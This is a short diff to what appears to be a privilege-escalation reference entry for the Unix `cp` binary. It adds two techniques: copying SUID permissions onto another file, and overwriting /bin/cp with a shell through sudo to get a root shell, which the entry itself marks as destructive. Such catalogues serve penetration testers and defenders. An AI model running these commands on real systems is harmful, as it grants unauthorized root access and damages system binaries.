@@ -18,6 +18,10 @@ functions:
         TF=$(mktemp)
         echo "DATA" > $TF
         ./cp $TF $LFILE
+    - description: This can copy SUID permissions from any SUID binary (e.g., `cp` itself) to another.
+      code: |
+        LFILE=file_to_change
+        ./cp --attributes-only --preserve=all ./cp "$LFILE"
   sudo:
     - code: |
         LFILE=file_to_write
@@ -28,4 +32,8 @@ functions:
         TF=$(mktemp)
         echo "DATA" > $TF
         sudo cp $TF $LFILE
+    - description: This overrides `cp` itself with a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `cp` by path. Warning, this is a destructive action.
+      code: |
+        sudo cp /bin/sh /bin/cp
+        sudo cp
 ---
